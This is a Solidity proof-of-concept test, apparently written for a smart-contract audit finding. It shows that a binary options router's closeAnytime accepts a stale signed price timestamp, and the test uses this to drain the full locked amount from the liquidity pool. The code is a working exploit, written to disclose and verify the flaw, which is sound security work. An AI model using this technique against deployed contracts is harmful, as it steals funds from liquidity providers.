// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

import "./BufferHarness.sol";

/// AuditVault #55636 [H-04] — closeAnytime feeds `publisherSignInfo.timestamp`
/// straight into `options.unlock(...)` as the closing time and NEVER checks it is
/// anywhere near `block.timestamp`. With private keeper mode disabled, a trader
/// (or a malicious keeper) can settle an option using a STALE, favorable price
/// signature from the past — collecting a payout on an option that is worthless
/// at the real current price.
contract PoC_55636 is BufferBase {
    address internal constant TRADER = address(0xA11CE);
    address internal constant VICTIM = address(0xBEEF);

    uint256 internal constant STRIKE = 1_000e8;
    uint256 internal constant AMOUNT = 100e6;
    uint256 internal constant FEE = 60e6;

    function test_H04_settleInThePastWithStalePrice() public {
        _deployStack();

        // The option was opened at t=1000, expiring at t=4600. A price spike to
        // 1500 (deep ITM) happened at t=4700 and the publisher signed it then.
        uint256 queuedTime = 1_000;
        uint256 period = 3_600; // expiration = 4600

        // We are now FAR in the future; the option is deep out-of-the-money.
        vm.warp(50_000);

        uint256 optId = _seed(TRADER, 1, STRIKE, AMOUNT, FEE, queuedTime, period);

        // --- NEGATIVE CONTROL: honest close at the CURRENT price (900, OTM) ---
        // A fresh publisher price now says 900 (< strike) => option is worthless.
        uint256 ctrlId = _seed(VICTIM, 2, STRIKE, AMOUNT, FEE, queuedTime, period);
        IBufferRouter.CloseAnytimeParams memory honest =
            _closeParams(ctrlId, 900e8, true, block.timestamp, block.timestamp, block.timestamp);
        _attestUser(honest, 2);
        _attestPublisher(honest);
        uint256 vicBefore = usdc.balanceOf(VICTIM);
        _close(honest);
        assertEq(usdc.balanceOf(VICTIM) - vicBefore, 0, "honest current-price close: worthless");
        assertEq(uint256(_optionState(ctrlId)), uint256(IBufferBinaryOptions.State.Expired), "control expired worthless");

        // --- EXPLOIT: settle "in the past" with the stale ITM price signature ---
        // closingTime = 4700 (>= expiration 4600) and price 1500 (> strike) => the
        // option exercises for the FULL locked amount. closeAnytime never checks
        // that 4700 is anywhere near block.timestamp (=50000).
        IBufferRouter.CloseAnytimeParams memory exploit =
            _closeParams(optId, 1_500e8, true, 4_700, 4_700, 4_700);
        _attestUser(exploit, 1);
        _attestPublisher(exploit);

        uint256 poolBefore = usdc.balanceOf(address(pool));
        uint256 traderBefore = usdc.balanceOf(TRADER);
        _close(exploit);
        uint256 payout = usdc.balanceOf(TRADER) - traderBefore;

        // === HARM: full payout on a currently-worthless option, using a stale ts ===
        assertEq(uint256(_optionState(optId)), uint256(IBufferBinaryOptions.State.Exercised), "exploited option exercised");
        assertEq(payout, AMOUNT, "attacker drained the FULL locked amount via a stale timestamp");
        assertEq(poolBefore - usdc.balanceOf(address(pool)), AMOUNT, "LP pool paid out the full amount");
        emit log_named_uint("stale-timestamp payout (USDC 1e6)", payout);
        emit log_named_uint("fair current-price payout (USDC 1e6)", 0);
    }
}
